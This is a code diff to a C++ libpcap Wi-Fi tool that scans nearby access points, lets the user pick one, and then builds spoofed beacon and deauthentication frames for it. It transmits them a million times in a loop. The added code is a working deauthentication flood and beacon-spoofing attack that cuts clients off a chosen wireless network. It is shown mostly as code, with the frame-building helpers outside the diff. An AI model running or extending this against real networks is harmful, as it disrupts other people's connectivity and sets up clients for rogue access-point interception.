@@ -6,6 +6,7 @@
 #include <string.h>
 #include <vector>
 #include <map>
+#include <unistd.h>
 
 
 void usage(){
@@ -15,13 +16,7 @@ void usage(){
 }
 
 
-struct ap{
 
-    //vector<uint8_t> bssid;
-    vector<uint8_t> essid;
-    uint8_t beacon;
-    int8_t pwr;
-};
 
 
 int main(int argc, char *argv[])
@@ -49,7 +44,7 @@ int main(int argc, char *argv[])
 
     set<vector<uint8_t>> ap_list ;
     map<vector<uint8_t>,struct ap> ap_ls;
-    printf("BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID  \n");
+    printf("    BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID  \n");
 
     while(true){
         if(cnt==50) break;
@@ -86,7 +81,8 @@ int main(int argc, char *argv[])
        struct ap temp_ap;
        temp_ap.beacon=1;
        temp_ap.essid=name;
-       temp_ap.pwr=-((~(rd->signal)+1)&0x000000FF);
+       temp_ap.pwr=-((~(*((uint8_t*)rd+22))+1)&0x000000FF);
+       temp_ap.essid_len=size;
        //printf("%d\n",temp_ap.pwr);
        ap_ls.insert({temp,temp_ap});
 
@@ -117,8 +113,10 @@ int main(int argc, char *argv[])
 */
 
 
+    int num=1;
     for(auto i=ap_ls.begin();i!=ap_ls.end();i++)
            {
+             printf("[%d] ",num++);
 
              for(int j=0;j<5;j++)
                  printf("%02x:",i->first[j]);
@@ -132,4 +130,53 @@ int main(int argc, char *argv[])
 
            }
         printf("total AP : %ld\n",ap_list.size());
+
+
+        int sel;
+        printf("select AP Number : ");
+        scanf("%d",&sel);
+
+        int number=1;
+
+       vector<uint8_t> sel_mac;struct ap sel_ap;
+        for(auto i=ap_ls.begin();i!=ap_ls.end();i++)
+               {
+                 if(sel!=number++) continue;
+                 printf("selected AP\n");
+                 printf("BSSID:");
+
+                 sel_mac=i->first;
+                 sel_ap=i->second;
+
+                 for(int j=0;j<5;j++)
+                     printf("%02x:",i->first[j]);
+                 printf("%02x\n",i->first[5]);
+                 printf("ESSID:");
+                 for(auto k=i->second.essid.begin();k<i->second.essid.end();k++)
+                      printf("%c",(*k));
+                 printf("\n");
+
+               }
+
+
+        uint8_t beacon1_size;
+        uint8_t *beacon1=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,1);
+
+        uint8_t deauth_size=0;
+        uint8_t *deauth=make_deauth(sel_mac,(uint8_t*)&deauth_size);
+
+        for(int i=0;i<1000000;i++){
+         if (pcap_sendpacket(handle, beacon1, beacon1_size) != 0) printf("\nsend packet Error \n");
+
+         if(i%1000==0) {printf("send beacon,deauth packet %d\n", i);if (pcap_sendpacket(handle, deauth, deauth_size) != 0) printf("\nsend packet Error \n");}
+                 }
+
+/*
+        for(int i=0;i<100;i++){
+         if (pcap_sendpacket(handle, deauth, deauth_size) != 0) printf("\nsend packet Error \n");
+         printf("send deauth packet %d\n", i);
+         sleep(1);
+                 }*/
+
+
 }
